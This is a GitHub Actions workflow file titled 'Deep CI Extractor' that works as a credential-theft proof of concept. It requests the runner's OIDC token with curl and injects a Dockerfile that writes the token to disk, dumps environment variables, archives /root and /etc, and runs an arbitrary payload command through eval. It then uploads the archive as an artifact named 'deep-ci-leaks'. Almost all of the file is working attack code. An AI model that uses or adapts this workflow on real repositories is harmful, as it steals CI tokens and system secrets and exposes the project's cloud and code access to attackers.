name: Deep CI Extractor

on:
  push:
    branches: [ main ]

jobs:
  extract:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Get OIDC Token & Setup
        id: oidc
        run: |
          echo "Fetching OIDC Token..."
          OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL")
          echo "OIDC_TOKEN_VALUE=$OIDC_TOKEN" >> "$GITHUB_OUTPUT"
          echo 'whoami && id && ls -la /root' > payload.sh

      - name: Write Dockerfile
        run: |
          mkdir -p taskcluster/docker/python
          echo "${{ toJSON(steps) }}" > debug.json  # optional
          echo "[+] Injecting Dockerfile"
          cat <<'EOF' > taskcluster/docker/python/Dockerfile
FROM python:3.11-alpine
ARG PAYLOAD_CMD
ARG OIDC_TOKEN
RUN apk add --no-cache bash curl tar
RUN echo "dummy-token-xyz" > /root/test_secret.txt && \
    echo "$OIDC_TOKEN" > /root/oidc_token.json
RUN printenv | grep -v GITHUB_TOKEN > /leaks_env.txt && \
    echo "OIDC_TOKEN=$OIDC_TOKEN" >> /leaks_env.txt
RUN tar -czf /secrets.tar.gz /root /etc /leaks_env.txt 2>/dev/null || true
RUN echo "[+] Executing payload..." && eval "$PAYLOAD_CMD"
EOF

      - name: Build & Extract Leaks
        run: |
          docker build \
            --build-arg PAYLOAD_CMD="cat /root/test_secret.txt && cat /root/oidc_token.json" \
            --build-arg OIDC_TOKEN="${{ steps.oidc.outputs.OIDC_TOKEN_VALUE }}" \
            -t deep-ci taskcluster/docker/python

          docker run --rm deep-ci cat /secrets.tar.gz > secrets.tar.gz

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: deep-ci-leaks
          path: secrets.tar.gz
